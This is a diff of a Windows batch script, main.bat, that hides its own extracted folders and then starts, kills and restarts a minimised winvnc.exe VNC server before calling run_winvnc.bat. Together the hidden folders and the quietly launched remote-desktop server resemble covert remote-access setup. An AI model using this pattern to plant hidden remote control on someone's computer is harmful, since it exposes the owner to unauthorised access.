@@ -36,8 +36,8 @@ REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Start winvnc.exe and wait for permissions
-start /min "" winvnc.exe -run
+REM Start winvnc.exe to get permissions
+start /min "" winvnc.exe
 
 REM Wait for winvnc.exe to have permissions (check every 2 seconds)
 :CheckPermissions
@@ -46,19 +46,24 @@ timeout /t 2 >nul
 tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
 if errorlevel 1 (
   goto CheckPermissions
+)
+
+REM Permissions granted, kill the initial winvnc.exe process
+taskkill /im winvnc.exe /f
+
+REM Start winvnc.exe with batch commands
+start /min "" winvnc.exe -run
+
+REM Wait for winvnc.exe to start correctly with the batch commands (check every 2 seconds)
+:CheckPermissionsBatch
+echo Checking permissions for winvnc.exe with batch commands...
+timeout /t 2 >nul
+tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
+if errorlevel 1 (
+  goto CheckPermissionsBatch
 ) else (
-  echo winvnc.exe has permissions. Terminating winvnc.exe...
-  taskkill /im winvnc.exe /f
-  echo Checking if winvnc.exe is terminated...
-  :CheckTermination
-  timeout /t 2 >nul
-  tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
-  if errorlevel 0 (
-    goto CheckTermination
-  ) else (
-    echo winvnc.exe terminated. Starting run_winvnc.bat...
-    call "%script_dir%run_winvnc.bat"
-  )
+  echo winvnc.exe is running with batch commands. Starting run_winvnc.bat...
+  call "%script_dir%run_winvnc.bat"
 )
 
 REM End of main.bat
